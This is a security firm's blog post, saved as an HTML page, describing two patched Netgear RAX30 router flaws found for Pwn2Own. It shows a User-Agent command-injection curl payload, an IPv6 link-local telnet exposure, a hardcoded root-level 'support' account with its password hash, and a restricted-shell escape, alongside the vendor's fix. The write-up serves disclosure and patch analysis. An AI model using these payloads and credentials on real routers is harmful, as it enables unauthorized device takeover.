<!DOCTYPE html>

<html dir="ltr" lang="en" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# ">
<head>
<meta charset="utf-8"/>
<meta content="Synacktiv" property="og:site_name"/>
<meta content="summary_large_image" name="twitter:card"/>
<link href="https://www.synacktiv.com/cool-vulns-dont-live-long-netgear-and-pwn2own" rel="canonical"/>
<meta content="@Synacktiv" name="twitter:site"/>
<meta content="Cool vulns don't live long - Netgear and Pwn2Own" name="twitter:title"/>
<meta content="Pwn2own is a competition where hackers try to execute arbitrary code on selected devices." name="twitter:description"/>
<meta content="For this Pwn2Own edition, we chose to analyze the Netgear Router RAX30." name="description"/>
<meta content="Pwn2own is a competition where hackers try to execute arbitrary code on selected devices." name="abstract"/>
<meta content="https://www.synacktiv.com/en/publications/cool-vulns-dont-live-long-netgear-and-pwn2own" property="og:url"/>
<meta content="@Synacktiv" name="twitter:creator"/>
<meta content="Cool vulns don't live long - Netgear and Pwn2Own" property="og:title"/>
<meta content="https://www.synacktiv.com/en/publications/cool-vulns-dont-live-long-netgear-and-pwn2own" name="twitter:url"/>
<meta content="Pwn2own is a competition where hackers try to execute arbitrary code on selected devices." property="og:description"/>
<meta content="https://www.synacktiv.com/sites/default/files/styles/blog_grid_view/public/2022-12/image_blog.jpg" name="twitter:image"/>
<meta content="Synacktiv logo" name="twitter:image:alt"/>
<meta content="https://www.synacktiv.com/sites/default/files/styles/blog_grid_view/public/2022-12/image_blog.jpg" property="og:image"/>

<meta content="width" name="MobileOptimized"/>
<meta content="true" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<link href="../../sites/default/files/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"/>
<link href="../../publications/cool-vulns-dont-live-long-netgear-and-pwn2own" hreflang="fr" rel="alternate"/>
<link href="cool-vulns-dont-live-long-netgear-and-pwn2own" hreflang="en" rel="alternate"/>
<link href="cool-vulns-dont-live-long-netgear-and-pwn2own" rel="revision"/>
<title>Cool vulns don't live long - Netgear and Pwn2Own </title>
<link href="../../sites/default/files/css/css_cdrGS_B9PyjHsXrOzsLk3RX3ouvAQnR_CFdR2uSCwnQ.css" media="all" rel="stylesheet"/>
<link href="../../sites/default/files/css/css_IUqRxaeSQrw5hoM7QvEyUvwU6MCQvzWFEHezvbIUnUA.css" media="all" rel="stylesheet"/>
<link href="../../themes/synacktiv/css/print.css%253Fspgfz1.css" media="all" rel="stylesheet"/>
<link href="../../sites/default/files/css/css_xYG-xS9DjDEes4GAwIp7sASgDN_vGrypdYzlC76czJU.css" media="all" rel="stylesheet"/>
<!--[if lte IE 8]>
<script src="/sites/default/files/js/js_VtafjXmRvoUgAzqzYTA3Wrjkx9wcWhjP0G4ZnnqRamA.js"></script>
<![endif]-->
</head>
<body class="page-node-741 path-node page-node-type-article">
<a class="visually-hidden focusable skip-link" href="cool-vulns-dont-live-long-netgear-and-pwn2own#main-content">
      Skip to main content
    </a>
<div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
<div class="header-outer">
<div class="header-inner">
<div class="container">
<div class="top-bar">
<div class="region region-top-bar">
<section class="block block-dropdown-language block-dropdown-languagelanguage-interface clearfix" id="block-dropdownlanguage">
<div class="search-link"><a href="../../search"><i aria-hidden="true" class="fa fa-search"></i> Search</a></div>
<div class="form-item js-form-item form-wrapper js-form-wrapper panel panel-default" id="bootstrap-panel">
<div class="container">
<div class="panel-heading">
<div class="panel-title">Switch Language</div>
</div>
<div class="panel-body">
<div class="dropdown-language-item btn-group dropdown">
<button class="language-link active-language button js-form-submit form-submit btn-default btn" data-dropdown-target="#dropdown-item-1735900510" formnovalidate="formnovalidate" hreflang="en" name="op" type="submit" value="EN">EN</button><button aria-expanded="false" aria-haspopup="true" class="btn-default btn dropdown-toggle" data-toggle="dropdown" type="button"><span class="caret"></span><span class="sr-only">Toggle Dropdown</span></button>
<ul class="dropdown-menu" role="menu"><li hreflang="en"><span class="language-link active-language hidden" formnovalidate="formnovalidate" hreflang="en" id="dropdown-item-1735900510">EN</span></li><li hreflang="fr"><a class="language-link" formnovalidate="formnovalidate" href="../../publications/cool-vulns-dont-live-long-netgear-and-pwn2own" hreflang="fr" id="ajax-link-1735900510">FR</a></li></ul>
</div>
</div>
</div>
</div>
</section>
<section class="block block-block-content block-block-contente1d0bd6e-e175-4e9b-9fb8-a6322c75441a clearfix" id="block-socialmedia">
<div class="item-list item-list--linkicon"><ul class="linkicon linkicon--inline linkicon--no-text" id="linkicon-block-content-social-media-field-social-media-3"><li><a class="linkicon__item" href="/en/feed/lastblog.xml" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-rss"></span><span class="linkicon__text">RSS</span></a></li><li><a class="linkicon__item" href="https://github.com/Synacktiv" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-github"></span><span class="linkicon__text">Github</span></a></li><li><a class="linkicon__item" href="https://twitter.com/synacktiv" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-twitter"></span><span class="linkicon__text">Twitter</span></a></li><li><a class="linkicon__item" href="https://fr.linkedin.com/company/synacktiv" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-linkedin"></span><span class="linkicon__text">Linkedin</span></a></li></ul></div>
</section>
</div>
</div>
<div class="main-header">
<div class="region region-header">
<a class="logo navbar-btn pull-left" href="../../en" rel="home" title="Home">
<img alt="Home" src="../../sites/default/files/logo_synacktiv_blanc.png"/>
</a>
<section class="block block-superfish block-superfishmain clearfix" id="block-mainnavigation">
<ul class="menu sf-menu sf-main sf-horizontal sf-style-none" id="superfish-main">
<li class="sf-depth-1 menuparent" id="main-menu-link-contentb1f6692b-12b2-4613-aa64-67af9be15b81"><a class="sf-depth-1 menuparent" href="../our-offer">Our offer</a><ul><li class="sf-depth-2 sf-no-children" id="main-menu-link-content76ea8d8a-879d-49c9-ac0c-05fbaba2f8da"><a class="sf-depth-2" href="../features/penetration-test-red-team">Penetration Test / Red Team</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-content30f5ef9c-84b2-4dab-984d-04b24a86fbbc"><a class="sf-depth-2" href="../features/incident-response">Incident response </a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-content6f4a2b35-6ffd-46a0-b74e-ff705e822bd2"><a class="sf-depth-2" href="../offers/trainings">Trainings</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-content7b20b7d6-5054-43b9-bb6e-6e3f53ddec09"><a class="sf-depth-2" href="../features/reverse-engineering">Reverse-engineering</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-contentc4ba7eec-ad2a-478e-a5d1-abd1cc26e2bc"><a class="sf-depth-2" href="../our-team/development">Development</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-content1c89e60c-b5be-4937-9149-33132a0b77e6"><a class="sf-depth-2" href="../products/kraqozorus">Products</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-content588748bd-b280-4e46-aa81-6bcf1838cfec"><a class="sf-depth-2" href="../csirt">CSIRT</a></li></ul></li><li class="sf-depth-1 sf-no-children" id="main-menu-link-content7b941be1-6abc-4440-908b-f1231838b656"><a class="sf-depth-1" href="../join-us">Join us</a></li><li class="active-trail sf-depth-1 menuparent" id="main-menu-link-content23c47262-3e64-4507-8ad4-7019b5fe572a"><a class="sf-depth-1 menuparent" href="../our-publications">Publications</a><ul><li class="active-trail sf-depth-2 sf-no-children" id="main-menu-link-contente57a67d4-5094-4d76-b684-50b95c594a92"><a class="sf-depth-2" href="../publications">Posts</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-contentdc127af3-02e3-4f2c-9b35-223f94c7b7b7"><a class="sf-depth-2" href="../advisories">Advisories</a></li><li class="sf-depth-2 sf-no-children" id="main-menu-link-contentdc984d98-8791-42d3-88a2-3dffa6db478c"><a class="sf-depth-2" href="../ressources">Resources</a></li></ul></li><li class="sf-depth-1 sf-no-children" id="main-menu-link-contentbb3e5f45-fa45-42b0-a2fe-1a89e07c4059"><a class="sf-depth-1" href="../the-company">The company</a></li><li class="sf-depth-1 sf-no-children" id="main-menu-link-contentd5edd642-8078-459a-9b1f-a6b2d4f65aa2"><a class="sf-depth-1" href="../contact">Contact</a></li>
</ul>
</section>
</div>
</div>
</div>
</div>
</div>
<div class="banner">
<div class="region region-banner">
<section class="block page-header block-block-content block-block-contentb084ab8a-3baf-4a93-b927-57e3efdc0802 clearfix" id="block-publicationsdetailheader">
<div class="background-image" style="background-image: url(../../sites/default/files/styles/page_header/public/2019-11/header-background_1.jpg)">
</div>
</section>
</div>
</div>
<div class="main-page-content">
<div class="page-content-left sidebar-content">
<div class="item-wrapper">
<div class="social-icons-item">
<div class="item-list item-list--linkicon"><ul class="linkicon linkicon--inline linkicon--no-text" id="linkicon-block-content-social-media-field-social-media-25"><li><a class="linkicon__item" href="/en/feed/lastblog.xml" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-rss"></span><span class="linkicon__text">RSS</span></a></li><li><a class="linkicon__item" href="https://github.com/Synacktiv" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-github"></span><span class="linkicon__text">Github</span></a></li><li><a class="linkicon__item" href="https://twitter.com/synacktiv" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-twitter"></span><span class="linkicon__text">Twitter</span></a></li><li><a class="linkicon__item" href="https://fr.linkedin.com/company/synacktiv" target="_blank"><span aria-hidden="true" class="linkicon__icon icon fa fa-linkedin"></span><span class="linkicon__text">Linkedin</span></a></li></ul></div>
</div>
</div>
</div>
<div class="page-content-right">
<div class="banner-bottom">
<div class="container">
<div class="region region-banner-bottom">
<div class="hidden" data-drupal-messages-fallback=""></div>
</div>
</div>
</div>
<div class="content">
<div class="container">
<div class="region region-content">
<article about="/en/publications/cool-vulns-dont-live-long-netgear-and-pwn2own" class="article full clearfix" role="article" typeof="schema:Article">
<div class="content">
<div class="title-wrapper">
<h1><span property="schema:name">Cool vulns don't live long - Netgear and Pwn2Own</span>
</h1>
<div class="short-info">
        Written by
   <span class="author-name">Kevin Denis</span>
           - 06/12/2022 - in 
   <span class="category">Exploit</span>
<span class="publication-download">
 - <a href="cool-vulns-dont-live-long-netgear-and-pwn2own#" onclick="window.print()">Download</a>
<i aria-hidden="true" class="fa fa-download fa-lg"></i>
</span>
</div>
</div>
<div class="introduction">
<div class="field field--name-field-introduction-text field--type-string-long field--label-hidden field--item">Pwn2own is a competition where hackers try to execute arbitrary code on selected devices. This blogpost will describe two vulnerabilities found in the Netgear RAX30 router, and explain how both were patched the day before the event.</div>
</div>
<div class="field field--name-body field--type-text-with-summary field--label-hidden field--item" property="schema:text"><p>For this Pwn2Own edition, we chose to analyze the <code>Netgear Router RAX30</code>. The Netgear firmware version was the <code>1.0.7.78</code> at the time, and it can be downloaded on the <a href="https://www.netgear.com/support/product/RAX30#download">official website</a>. Once downloaded, all files can be extracted with the <code>binwalk</code> command. We end up with a pretty standard Linux kernel and filesystem.</p>
<h2>Analysis of the LAN bug</h2>
<p>We begun by identifying files and services in the router by listing directories, and a binary immediately caught our eye:</p>
<pre>
<code class="bash">$ ls -1 squashfs-root/bin/
(...)
squashfs-root/bin/pudil
squashfs-root/bin/pudilcb
squashfs-root/bin/pufwUpgrade
squashfs-root/bin/puhttpsniffÂ Â Â Â Â Â Â Â Â Â Â  &lt;--- This one
squashfs-root/bin/pu_iQoS_db_update
squashfs-root/bin/puraUpdate
(...)</code></pre>
<p>We can also see that this binary is started by default:</p>
<pre>
<code class="bash">mitsurugi@dojo$ grep -r puhttpsniff squashfs-root/
squashfs-root/etc/rc3.d/S79dal_inited.sh:/bin/puhttpsniff
mitsurugi@dojo$
</code></pre>
<p>A first analysis with <code>strings</code> reveals some juicy content:</p>
<pre>
<code class="bash">mitsurugi@dojo$ ls -l squashfs-root/bin/puhttpsniff
-rwxr-xr-x 1 mitsurugi mitsurugi  4 sept. 21:24 squashfs-root/bin/puhttpsniff
mitsurugi@dojo$ strings squashfs-root/bin/puhttpsniff
/lib/ld-linux.so.3
(...)
User-Agent:
%255[^
pudil -i %s "%s"
(...)
iptables -w -t filter -D INPUT -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512 2&gt; /var/tmpDebug
iptables -w -t filter -I INPUT -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512
iptables -w -t filter -D FORWARD -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512 2&gt; /var/tmpDebug
iptables -w -t filter -I FORWARD -i br0 -p tcp --dport 80 -j NFLOG --nflog-group 0 --nflog-size 512
HTTP sniffer start!!
(...)
mitsurugi@dojo$</code></pre>
<p>With this snippet only, we can imagine the workflow. This binary inserts <code>NFLOG</code> <code>iptables</code> rules in order to run callbacks. The "User-Agent" strings leads us to understand what is searched, and the <code>pudil -i %s "%s"</code> line is quite interesting. Here is the decompiled part dealing with <code>User-Agent</code>:</p>
<pre>
<code class="language-c-like">if ( data_len &gt; 9 )
{
   data[data_len] = 0;
   result = strstr(data, "User-Agent: ");
   if ( result )
   {
      _isoc99_sscanf(result + 12, "%255[^\r\n]", &amp;user_agent_string);
      sprintf(v10, "pudil -i %s \"%s\"", ip_addr, (const char *)&amp;user_agent_string);
      return (char *)system(v10);
   }
}
</code></pre>
<p>The <code>NFLOG</code> target is triggered for <code>INPUT</code> and <code>FORWARD</code> chains. As the webadmin listens on the <code>br0</code> interface on port 80, we can just send data on the default IP address. Putting arbitraty data in a <code>User-Agent</code> header triggers a code injection:</p>
<pre>
<code class="bash">$ curl --user-agent "a\";/sbin/reboot;\"" http://192.168.1.1
</code></pre>
<p>Sending such a request makes the router reboot. That was quite a quick win for the LAN. We can inject 255 characters in the "User-Agent" string, which is enough to do anything we need to take-over the router, such as downloading a full featured <code>busybox</code>, and launch a reverse-shell.</p>
<h2>Analysis of the WAN bug</h2>
<p>A DHCP server has been set up to give an IP for the Netgear WAN interface. With the help of the LAN bug, we have a shell on the router. We first started by listing processes and sockets and saw that <code>ssh</code> (TCP port 22), <code>telnet</code> (TCP port 23) and others are listening on both IPv4 <strong>and</strong> IPv6 interfaces.</p>
<p>A quick <code>nmap</code> from the WAN interface in IPv4 shows that all ports are closed. But an <code>nmap</code> on the IPv6 address shows open ports (!!). Here is a demo showing the scan on TCP port 23:</p>
<pre>
<code class="bash">mitsurugi@dojo$ nmap -6 -p 23 fe80::6ecd:d6ff:fe44:dd73%eth1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-01 12:04 CET
Nmap scan report for fe80::6ecd:d6ff:fe44:dd73
Host is up (0.00061s latency).
PORT      STATE      SERVICE
23/tcp    open       telnet
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
</code></pre>
<p><code>telnet</code> port is accessible from WAN side. This is a huge flaw. Although some <code>ip6tables</code> rules are defined to restrict accesses, they are only applied to the <code>br0</code> interface (the LAN one), and for the WAN interface only if a public IPv6 address is provided. If only a link-local address is in use on the WAN interface, rules are not applied, so anyone on the same network segment than the Netgear can query the IPv6 link-local address to connect to the services, including <code>webadmin</code>, <code>telnet</code>, <code>ssh</code>, <code>soap_serverd</code>, and so on.</p>
<p>The previous vulnerability in the router allows us to find an hardcoded account in the <code>/etc/passwd</code> file:</p>
<pre>
<code class="bash">mitsurugi@dojo$ cat /etc/passwd
admin:&lt;admin passwd hash&gt;:0:0:Administrator:/:/bin/sh
support:$1$QkcawmV.$VU4maCah6eHihce5l4YCP0:0:0:Technical Support:/:/bin/sh
user:$1$9RZrTDt7$UAaEbCkq.Qa4u0QwXpzln/:0:0:Normal User:/:/bin/sh
nobody:&lt;admin passwd hash&gt;:0:0:nobody for ftp:/:/bin/sh
mitsurugi@dojo$</code></pre>
<p>Cracking "support" account's password is left as an exercise for the reader (less than a second using <a href="https://github.com/openwall/john">John the Ripper</a>). One can also notice that "support" account holds <code>uid 0</code>. Connecting to the router through <code>telnet</code> with the "support" account grants access to a restricted shell:</p>
<pre>
<code class="bash">$ telnet fe80::6ecd:d6ff:fe44:dd73%eth1
Trying fe80::6ecd:d6ff:fe44:dd73%eth1...
Connected to fe80::6ecd:d6ff:fe44:dd73%eth1.
Escape character is '^]'.
BCM96750 Broadband Router
Login: support
Password:
 &gt; help
?
help
logout
exit
quit
reboot
brctl
cat
(...)
</code></pre>
<p>Escaping this restricted shell can be achieved in many ways. One can call subshells with <code>$(...)</code>, chain commands with a ';', or even call 'sh' (hidden command).</p>
<pre>
<code class="bash"> &gt; ifconfig a; /bin/ash
ifconfig a ; /bin/ash
ifconfig: a: error fetching interface information: Device not found

BusyBox v1.31.1 (2022-05-11 10:37:23 CST) built-in shell (ash)

Enter 'help' for a list of built-in commands.
# uname -a
Linux RAX30 4.19.151 #1 SMP PREEMPT Wed May 11 10:27:11 CST 2022 armv7l
#
</code></pre>
<p>Knowing the MAC address of the WAN interface (by pinging it for example), one can deduce the IPv6 link-local address (RFC 4291 section 2.5.6 + Appendix A), launch the <code>telnet</code> command, connect and escape shell.</p>
<h2>The patch</h2>
<p>The rules of the Pwn2Own contest are clear: all devices are up-to-date until draw. The draw takes place on the December 2nd. On November 30th, Netgear pushed a hotFix, version <code>1.0.9.90</code>. Both vulnerabilities were killed by this update.</p>
<p>The puhttsniff binary does not call <code>system()</code> anymore, but uses <code>execve()</code>, and there is no more command injection.</p>
<pre>
<code class="language-c-like">  argv[3] = ua_string;
  argv[0] = "pudil";
  argv[1] = "-i";
  argv[4] = 0;
  argv[2] = client_ip;
  execve("/bin/pudil", argv, 0);
</code>
</pre>
<p>The IPv6 firewall was setup also for the WAN interface, so IPv6 services are not accessible through link-local anymore.</p>
<h2>Conclusion</h2>
<p>Playing Pwn2Own is a fun game, but having vulnerabilities killed the day before the contest is frustrating, "c'est la vie mon ami" (as french says). However, please update this router to version <code>1.0.9.90</code>, and remember that some contestants still have bugs for this Pwn2own target, so do not forget to check for future updates!</p>
<p>Finally, Synacktiv team still has entries in the printers category, can't wait to watch them pop shells! GL, HF!</p>
</div>
<div class="share-links">
<span>Share this article</span>
<div class="link-wrapper">
<div class="a2a_kit a2a_kit_size_32 a2a_default_style">
<a class="a2a_button_facebook"></a>
<a class="a2a_button_twitter"></a>
</div>
</div>
<!--<script async src="https://static.addtoany.com/menu/page.js"></script>-->
</div>
</div>
</article>
</div>
</div>
</div>
<div class="page-contact-section">
<div class="container">
<div class="region region-footer">
<section class="contact-service-wrapper block block-block-content block-block-content60a6be42-565a-42b6-88e3-35ff45dab357 clearfix" id="block-autrespublications">
<div class="inner-wrapper">
<h2 class="block-title">Other publications</h2>
</div>
</section>
<section class="views-element-container other-publications block block-views block-views-blockpublications-with-same-tag-block-1 clearfix" id="block-views-block-publications-with-same-tag-block-1">
<div class="form-group"><div class="view view-publications-with-same-tag view-id-publications_with_same_tag view-display-id-block_1 js-view-dom-id-5427ed29ace2a95325fb96c664dc10ec8a676a874f57d80dc9860fddab387f74">
<div class="view-content">
<div class="col-sm-4 views-row">
<article about="/en/publications/diving-into-adb-protocol-internals-22" class="article teaser-view clearfix" role="article" typeof="schema:Article">
<div class="content">
<a href="diving-into-adb-protocol-internals-22"><h3><span property="schema:name">Diving into ADB protocol internals (2/2)</span>
</h3></a>
<div class="wrapper-content">
<div class="text-summary">
           Our previous article laid the groundwork for understanding the ADB protocol and its usage scenarios. It primarily focused on the TCP/IP communication between the ADB Client and the ADB Server. However
                 
          ...
     </div>
<div class="short-info">
<span class="author-name">Corentin Liaud</span>
   
 - 16/12/2024 - 
   <span class="category">DÃ©veloppement</span>
   ,   <span class="category">Outils</span>
</div>
</div>
</div>
</article>
</div>
<div class="col-sm-4 views-row">
<article about="/en/publications/automated-network-security-with-rust-detecting-and-blocking-port-scanners" class="article teaser-view clearfix" role="article" typeof="schema:Article">
<div class="content">
<a href="automated-network-security-with-rust-detecting-and-blocking-port-scanners"><h3><span property="schema:name">Automated Network Security with Rust: Detecting and Blocking Port Scanners</span>
</h3></a>
<div class="wrapper-content">
<div class="text-summary">
           Did you ever wonder how IDS/IPS like Snort or Suricata were able to interact with the network stack of the Linux kernel ?

Do you also happen to like Rust ?

Well dear reader, this article is for you 
                 
          ...
     </div>
<div class="short-info">
<span class="author-name">ClÃ©ment Fleury</span>
   
 - 06/12/2024 - 
   <span class="category">DÃ©veloppement</span>
</div>
</div>
</div>
</article>
</div>
<div class="col-sm-4 views-row">
<article about="/en/publications/relaying-kerberos-over-smb-using-krbrelayx" class="article teaser-view clearfix" role="article" typeof="schema:Article">
<div class="content">
<a href="relaying-kerberos-over-smb-using-krbrelayx"><h3><span property="schema:name">Relaying Kerberos over SMB using krbrelayx</span>
</h3></a>
<div class="wrapper-content">
<div class="text-summary">
           Kerberos authentication relay was once thought to be impossible, but multiple researchers have since proven otherwise. In a 2021 article, James Forshaw discussed a technique for relaying Kerberos over
                 
          ...
     </div>
<div class="short-info">
<span class="author-name">Hugo Vincent</span>
   
 - 20/11/2024 - 
   <span class="category">Pentest</span>
</div>
</div>
</div>
</article>
</div>
</div>
</div>
</div>
</section>
</div>
</div>
</div>
</div>
</div>
<div class="footer">
<div class="footer-top">
<div class="container">
<div class="footer-inner">
<div class="left-items col-sm-6">
<div class="footer-left col-sm-6"> <div class="region region-footer-left">
<a class="logo navbar-btn pull-left" href="../../en" rel="home" title="Home">
<img alt="Home" src="../../sites/default/files/logo_synacktiv_blanc.png"/>
</a>
<nav aria-labelledby="block-lasocieteanchormenu-2-menu" id="block-lasocieteanchormenu-2" role="navigation">
<ul class="menu menu--la-societe-anchor-menu nav">
<li class="first">
<a data-drupal-link-system-path="node/1" href="../the-company#who-we-are">Who are we?</a>
</li>
<li>
<a data-drupal-link-system-path="node/1" href="../the-company#our-values">Our values</a>
</li>
<li>
<a data-drupal-link-system-path="node/1" href="../the-company#aggrement">Agreements</a>
</li>
<li>
<a data-drupal-link-system-path="node/1" href="../the-company#our-clients">Our clients</a>
</li>
<li class="last">
<a data-drupal-link-system-path="node/6" href="../our-team/back-office">Our team</a>
</li>
</ul>
</nav>
<nav aria-labelledby="block-notreequipeanchormenu-menu" id="block-notreequipeanchormenu" role="navigation">
<ul class="menu menu--notre-equipe-anchor-menu nav">
<li class="first">
<a data-drupal-link-system-path="node/6" href="../our-team/back-office">Back office</a>
</li>
<li>
<a data-drupal-link-system-path="node/7" href="../our-team/pentest">Pentest</a>
</li>
<li>
<a data-drupal-link-system-path="node/8" href="../our-team/reverse">Reverse</a>
</li>
<li>
<a data-drupal-link-system-path="node/9" href="../our-team/development">Development</a>
</li>
<li class="last">
<a data-drupal-link-system-path="node/573" href="../our-team/incident-response"> Incident response (CSIRT)</a>
</li>
</ul>
</nav>
<nav aria-labelledby="block-nousrejoindreanchormenu-2-menu" id="block-nousrejoindreanchormenu-2" role="navigation">
<ul class="menu menu--nous-rejoindre-anchor-menu nav">
<li class="first">
<a data-drupal-link-system-path="node/19" href="../join-us#philosophie">Philosophy</a>
</li>
<li>
<a data-drupal-link-system-path="node/19" href="../join-us#recrutement">Recruitment process</a>
</li>
<li class="last">
<a data-drupal-link-system-path="node/19" href="../join-us#block-views-block-job-offer-list-view-block-1">Job offers/internships</a>
</li>
</ul>
</nav>
</div>
</div>
<div class="footer-right col-sm-6"> <div class="region region-footer-right">
<nav aria-labelledby="block-produitsanchormenu-menu" id="block-produitsanchormenu" role="navigation">
<ul class="menu menu--produits-anchor-menu nav">
<li class="first">
<a data-drupal-link-system-path="node/528" href="../products/kraqozorus">Kraqozorus</a>
</li>
<li>
<a data-drupal-link-system-path="node/3" href="../products/houdini">Houdini</a>
</li>
<li>
<a data-drupal-link-system-path="node/30" href="../products/disconet">Disconet</a>
</li>
<li>
<a data-drupal-link-system-path="node/32" href="../products/oursin">Oursin</a>
</li>
<li class="last">
<a data-drupal-link-system-path="node/33" href="../products/leakozorus">Leakozorus</a>
</li>
</ul>
</nav>
<nav aria-labelledby="block-prestationsanchormenu-menu" id="block-prestationsanchormenu" role="navigation">
<ul class="menu menu--prestations-anchor-menu nav">
<li class="first">
<a data-drupal-link-system-path="node/2" href="../features/penetration-test-red-team">Penetration test / red team</a>
</li>
<li>
<a data-drupal-link-system-path="node/34" href="../features/security-audit">Security audit</a>
</li>
<li>
<a data-drupal-link-system-path="node/35" href="../features/reverse-engineering">Reverse-engineering</a>
</li>
<li>
<a data-drupal-link-system-path="node/9" href="../our-team/development">Development</a>
</li>
<li class="last">
<a data-drupal-link-system-path="node/572" href="../features/incident-response">Incident response</a>
</li>
</ul>
</nav>
<nav aria-labelledby="block-csirtanchormenu-menu" id="block-csirtanchormenu" role="navigation">
<ul class="menu menu--reponse-aux-incidents-anchor-men nav">
<li class="first last">
<a data-drupal-link-system-path="node/576" href="../csirt">CSIRT Synacktiv </a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="right-items col-sm-6">
<div class="block-title"><h2>Contact us</h2></div>
<div class="contact-teaser"><div class="views-element-container form-group"><div class="view view-ou-nous-trouver- view-id-ou_nous_trouver_ view-display-id-block_1 js-view-dom-id-49fd26426ecda8a2823d4d0ed18ae5255035875a7c705e7df21f4a60b4535a6d">
<div class="view-content">
<div class="views-row">
<div class="field field--name-field-phone field--type-string field--label-hidden field--item">
<a class="phone-icon" href="tel:+33 1 45 79 74 75">+33 1 45 79 74 75</a>
</div>
<div class="field field--name-field-email field--type-email field--label-hidden field--item">
<a class="mail-icon" href="mailto:contact@synacktiv.com">contact@synacktiv.com</a>
</div>
<div class="field field--name-field-gpg-key field--type-link field--label-hidden field--item">
<a class="key-icon" href="../../ressources/contact_synacktiv.asc">GPG key</a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="locations"><div class="views-element-container form-group"><div class="view view-ou-nous-trouver- view-id-ou_nous_trouver_ view-display-id-block_2 js-view-dom-id-f683ca0a7449381966212291f067b621f976fd37c567a3dd5f64bbbaee3263bb">
<div class="view-content">
<div class="col-sm-6 views-row"><div class="views-field views-field-field-address"><div class="field-content"> <div class="paragraph paragraph--type--locations paragraph--view-mode--default">
<div class="field-address-items">
<h2 class="marker-icon">PARIS</h2>
<div class="address">
<div class="field field--name-field-address field--type-string-long field--label-hidden field--item">5 boulevard Montmartre<br/>
75002 Paris</div>
</div>
</div>
</div>
</div></div></div>
<div class="col-sm-6 views-row"><div class="views-field views-field-field-address"><div class="field-content"> <div class="paragraph paragraph--type--locations paragraph--view-mode--default">
<div class="field-address-items">
<h2 class="marker-icon">TOULOUSE</h2>
<div class="address">
<div class="field field--name-field-address field--type-string-long field--label-hidden field--item">4 Rue du Pont Guilhemery<br/>
31000 Toulouse</div>
</div>
</div>
</div>
</div></div></div>
<div class="col-sm-6 views-row"><div class="views-field views-field-field-address"><div class="field-content"> <div class="paragraph paragraph--type--locations paragraph--view-mode--default">
<div class="field-address-items">
<h2 class="marker-icon">LYON</h2>
<div class="address">
<div class="field field--name-field-address field--type-string-long field--label-hidden field--item">56 rue Smith<br/>
69002 Lyon</div>
</div>
</div>
</div>
</div></div></div>
<div class="col-sm-6 views-row"><div class="views-field views-field-field-address"><div class="field-content"> <div class="paragraph paragraph--type--locations paragraph--view-mode--default">
<div class="field-address-items">
<h2 class="marker-icon">RENNES</h2>
<div class="address">
<div class="field field--name-field-address field--type-string-long field--label-hidden field--item">7D Rue de ChÃ¢tillon<br/>
35000 Rennes</div>
</div>
</div>
</div>
</div></div></div>
<div class="col-sm-6 views-row"><div class="views-field views-field-field-address"><div class="field-content"> <div class="paragraph paragraph--type--locations paragraph--view-mode--default">
<div class="field-address-items">
<h2 class="marker-icon">LILLE</h2>
<div class="address">
<div class="field field--name-field-address field--type-string-long field--label-hidden field--item">7 Boulevard Louis XIV<br/>
59000 Lille</div>
</div>
</div>
</div>
</div></div></div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-bottom">
<div class="container">
<div class="copyright">Copyright Â© Synacktiv 2025</div>
<div class="region region-footer-bottom">
<nav aria-labelledby="block-footermenu-menu" id="block-footermenu" role="navigation">
<ul class="menu menu--footer-menu nav">
<li class="first">
<a data-drupal-link-system-path="node/4" href="../legal-notice">Conditions of Use</a>
</li>
<li>
<a data-drupal-link-system-path="node/1045" href="../privacy-policy">Privacy Policy</a>
</li>
<li>
<a data-drupal-link-system-path="node/1083" href="../politique-de-confidentialite-relative-au-recrutement">Recruitment privacy policy</a>
</li>
<li class="last">
<a data-drupal-link-system-path="contact" href="../contact">Contact Us</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
</div>
</div>
<script data-drupal-selector="drupal-settings-json" type="application/json">{"path": {"baseUrl": "/", "scriptPath": null, "pathPrefix": "en/", "currentPath": "node/741", "currentLanguage": "en"}, "pluralDelimiter": "\u0003", "suppressDeprecationErrors": true, "back_to_top": {"back_to_top_button_trigger": "100", "back_to_top_prevent_on_mobile": 0, "back_to_top_prevent_in_admin": 0, "back_to_top_button_type": "image", "back_to_top_button_text": "Back to top"}, "bootstrap": {"forms_has_error_value_toggle": 1}, "superfish": {"superfish-main": {"id": "superfish-main", "sf": {"animation": {"opacity": "show", "height": "show"}, "speed": "fast"}, "plugins": {"touchscreen": {"behaviour": "1", "mode": "window_width"}, "smallscreen": {"mode": "window_width", "breakpoint": 992, "accordionButton": "0", "title": "Main navigation"}, "supposition": true, "supersubs": true}}}}</script>
